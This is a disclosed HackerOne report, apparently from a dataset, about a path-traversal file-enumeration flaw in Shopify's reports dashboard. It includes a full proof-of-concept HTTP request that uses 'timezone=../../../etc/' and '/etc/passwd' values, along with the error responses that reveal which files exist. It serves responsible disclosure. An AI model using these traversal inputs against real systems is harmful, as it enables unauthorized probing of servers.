---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '118688'
original_report_id: '118688'
title: File name and folder enumeration.
weakness: Information Disclosure
team_handle: shopify
created_at: '2016-02-25T06:15:35.671Z'
disclosed_at: '2016-03-01T02:20:13.488Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 6
tags:
- hackerone
- information-disclosure
---

# File name and folder enumeration.

## Metadata

- HackerOne Report ID: 118688
- Weakness: Information Disclosure
- Program: shopify
- Disclosed At: 2016-03-01T02:20:13.488Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hello,

An attacker can enumerate your sensitive files and folder (such as configuration files) name via the `timezone` parameter in `cube.csv`:

```
GET /cube.csv?q=SHOW+quantity_count%2C+total_sales+BY+product_type%2C+vendor%2C+product_title%2C+variant_title+FROM+products+SINCE+2016-01-15+UNTIL+2016-02-25+ORDER+BY+total_sales+DESC&token=WyIxMTgzODk5NCIsIjIwMTYtMDItMjVUMDY6NDg6NDcrMDA6MDAiXQ%3D%3D--7509095354b03b43d192b051cf1a41bca6ad3b7b&handle=Gross+sales+by+product+title&roles%5B%5D=web&roles%5B%5D=pos_login&beta=&user_id=63589959&timezone=../../../etc/ HTTP/1.1
Host: reports-dashboard.shopify.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: https://derision-t.myshopify.com/admin/reports/sales_by_product
Cookie: x=x
Connection: close
```

Response:

```
HTTP/1.1 400 Bad Request
Server: nginx
Date: Thu, 25 Feb 2016 06:10:01 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 31
Connection: close
Access-Control-Allow-Methods: GET, OPTIONS
Access-Control-Allow-Origin: *
Access-Control-Max-Age: 86400
Content-Security-Policy: default-src 'self'
Strict-Transport-Security: max-age=16070400; includeSubDomains
X-Content-Type-Options: nosniff
X-Download-Options: noopen
X-Frame-Options: DENY
X-Permitted-Cross-Domain-Policies: none
X-Xss-Protection: 1; mode=block

timezone (400): is a directory
```

Try again with: 

`timezone=../../../etc/passwd` result in:

 timezone (400): malformed time zone information

`timezone=../../../etc/passwd_error` it will throw:

 timezone (400): cannot find ../../../etc/passwd_error in zip file /usr/local/go/lib/time/zoneinfo.zip.

PoC: See shopify_file_enumeration.png

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
